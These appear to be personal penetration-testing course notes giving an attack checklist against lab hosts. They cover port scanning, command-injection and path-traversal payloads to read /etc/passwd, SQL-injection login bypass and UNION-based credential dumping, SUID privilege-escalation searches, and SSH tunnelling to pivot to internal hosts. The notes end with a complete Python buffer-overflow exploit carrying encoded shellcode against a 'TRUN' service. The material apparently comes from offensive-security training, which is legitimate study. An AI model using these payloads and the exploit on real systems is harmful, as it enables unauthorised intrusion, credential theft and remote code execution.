given ip = 10.50.33.213

nmap -Pn -T4 --min-rate 243232525 10.50.33.213 -p-

nc 10.50.33.213 <open port>

document it

		#### NMAP Scan Results ####
		nmap -Pn -T4 --min-rate 243232525 10.50.33.213 -p- 
		PORT		STATE		SERVICE
		22/tcp		open		ssh
		80/tcp		open		http
		
nmap -Pn -T4 --min-rate 243232525 10.50.33.213 -p- --script http-enum.nse
nikto -h 10.50.33.213

document it
		
		#### --script http-enum.nse ####
		copy and paste result
		
view webpage
see what you can do

document it
		
		#### 10.50.33.213 ####
		note the input field
		<url>
		
Attempt
Command injection
; whoami
; pwd

document it
		####
		note that it didn't work
		
Attempt
directory traversal
../../../../../../../../../../../../../../../../../../../etc/passwd

document it
		
		####
		note USERS AND THEIR SHELL
		
CHECK /ETC/HOSTS
../../../../../../../../../../../../../../../../../../../etc/hosts

document it 

		####
		note the next pivot

*IF YOU CAN GET A WEBSHELL ON YOUR BOX DO SSH KEYGEN*

generate keygen from lin-ops

Username and Password = SQL Injection

Username: 
' or 1='1
Password:
' or 1='1

go f12
network and refresh
click on post
click on request
click on raw
copy and paste username after the .php?

document it
		
		####
		copy and paste results
		base 64/ROT13 encrypted password
		
ssh using new found creds
whoami
hostname
bash
sudo -l
find / -type f -perm /4000 -ls 2>dev/null
					 /2000
					 /6000
					 
gtfobins

document it
			
			####
			note NO ESCALATION
			
ip neigh
as a last resort

for i in  {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done

document it 
		
		#### for i in  {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done ####
		copy and paste results
		
make a dynamic tunnel
ssh user@IP -D 9050

proxychains nmap -Pn -T4 --min-rate 243232525 192.168.28.181 -p-

nc 192.168.28.181 <open port>

document it

		nmap -Pn -T4 --min-rate 243232525 192.168.28.181 -p-
		PORT		STATE		SERVICE
		22/tcp		open		ssh
		80/tcp		open		http

ssh -M -S ~/.ssh/cm/T1 -o "ControlPersis=10m" user@IP

ssh -S ~/.ssh/cm/T1 -O forward -L8888:192.168.28.181:80 place

credential reuse

SQL INJECTIONS

figure out how it works

test every single option 1-9+
0.0.0.0:portnum/asdasd.php?variable=7 or 1=1#;

document it

			####
			varialble name and vuln option(s)
			
find number of columns with UNION

0.0.0.0:portnum/asdasd.php?variable=7 UNION SELECT 1,2,3;#

THERE WILL BE MORE COLUMNS!!!!!!!!!!!

UNION SELECT table_schema, column_names, table_name FROM information_schema.columns;#

Defaults:
information_schema, mysql, performance_schema

UNION SELECT name,username,user_id FROM siteuser.users;#

document it

			####
			annotate any new users/passwd
			annotate if you can or cannot get in the box
			
scan the next box

sudo vim /etc/proxychains.conf
tcp_read_time 8000
tcp_connect_time_out 600


nmap -Pn -T4 --min-rate 243232525 <newIP> -p- 2>/dev/null

try to ssh into the box Aaron's creds
'A'aron@IP 

hostname
whoami
sudo -l
	use the command
	*gtfobins*
cat /etc/hosts

find / -type f -perm /4000 -ls 2>dev/null
					 /2000
					 /6000

document it

	####

if you can 'which gdb' buffer overflow (Lesson 7)

for i in  {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
ttl = 128 = windows

nmap -Pn -T4 --min-rate 243232525 <newIP> -p- 2>/dev/null


  1 #!/usr/bin/python
  2 
  3 import socket
  4 
  5 buff = "TRUN /.:/"
  6 buff += "A" * 2003
  7 buff += "\xa0\x12\x50\x62"
  8 buff += "\x90" * 10
  9 buf =  b""
 10 buf += b"\xb8\xfc\xba\x16\x4b\xdb\xd2\xd9\x74\x24\xf4\x5b\x33"
 11 buf += b"\xc9\xb1\x59\x31\x43\x14\x83\xc3\x04\x03\x43\x10\x1e"
 12 buf += b"\x4f\xea\xa3\x51\xb0\x13\x34\x0d\x38\xf6\x05\x1f\x5e"
 13 buf += b"\x72\x37\xaf\x14\xd6\xb4\x44\x78\xc3\x4f\x28\x55\xe4"
 14 buf += b"\xf8\x86\x83\xcb\xf9\x27\x0c\x87\x3a\x26\xf0\xda\x6e"
 15 buf += b"\x88\xc9\x14\x63\xc9\x0e\xe3\x09\x26\xc2\x7f\xa3\xa8"
 16 buf += b"\x68\x3d\x78\x9f\x6f\x12\x0b\x5f\x08\x17\xcc\x2b\xa4"
 17 buf += b"\x16\x1d\x83\xbf\x51\x85\xa8\x98\x41\xb4\x7d\x9d\x4b"
 18 buf += b"\xc2\xbd\xd7\xc0\x1f\x36\xd6\x29\x5e\x9e\x28\x16\xa0"
 19 buf += b"\xd1\x46\x3a\x22\x2a\x60\xa2\x50\x40\x92\x5f\x63\x93"
 20 buf += b"\xe8\xbb\xe6\x03\x4a\x4f\x50\xe7\x6a\x9c\x07\x6c\x60"
 21 buf += b"\x69\x43\x2a\x65\x6c\x80\x41\x91\xe5\x27\x85\x13\xbd"
 22 buf += b"\x03\x01\x7f\x65\x2d\x10\x25\xc8\x52\x42\x81\xb5\xf6"
 23 buf += b"\x09\x20\xa3\x87\xf2\xba\xcc\xd5\x64\x76\x01\xe6\x74"
 24 buf += b"\x10\x12\x95\x46\xbf\x88\x31\xea\x48\x17\xc5\x7b\x5e"
 25 buf += b"\xa8\x19\xc3\x0f\x56\x9a\x33\x19\x9d\xce\x63\x31\x34"
 26 buf += b"\x6f\xe8\xc1\xb9\xba\x84\xcb\x2d\x4f\x6a\xeb\xa1\x27"
 27 buf += b"\x88\xf3\xb4\xb2\x05\x15\x96\xec\x45\x8a\x57\x5d\x25"
 28 buf += b"\x7a\x30\xb7\xaa\xa5\x20\xb8\x61\xce\xcb\x57\xdf\xa6"
 29 buf += b"\x63\xc1\x7a\x3c\x15\x0e\x51\x38\x15\x84\x53\xbc\xd8"
 30 buf += b"\x6d\x16\xae\x0d\x0a\xd8\x2e\xce\xbf\xd8\x44\xca\x69"
 31 buf += b"\x8f\xf0\xd0\x4c\xe7\x5e\x2a\xbb\x74\x98\xd4\x3a\x4c"
 32 buf += b"\xd2\xe3\xa8\xf0\x8c\x0b\x3d\xf0\x4c\x5a\x57\xf0\x24"
 33 buf += b"\x3a\x03\xa3\x51\x45\x9e\xd0\xc9\xd0\x21\x80\xbe\x73"
 34 buf += b"\x4a\x2e\x98\xb4\xd5\xd1\xcf\xc6\x12\x2d\x8d\xe0\xba"
 35 buf += b"\x45\x6d\xb1\x3a\x95\x07\x31\x6b\xfd\xdc\x1e\x84\xcd"
 36 buf += b"\x1d\xb5\xcd\x45\x97\x58\xbf\xf4\xa8\x70\x61\xa8\xa9"
 37 buf += b"\x77\xba\x5b\xd3\xf8\x3d\x9c\x24\x11\x5a\x9d\x24\x1d"
 38 buf += b"\x5c\xa2\xf2\x24\x2a\xe5\xc6\x12\x25\x50\x6a\x32\xac"
 39 buf += b"\x9a\x38\x44\xe5"
 40 
 41 
 42 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM )
 43 s.connect(("192.168.150.245", 9999))
 44 print s.recv(1024)
 45 s.send(buff + buf)
 46 s.close()

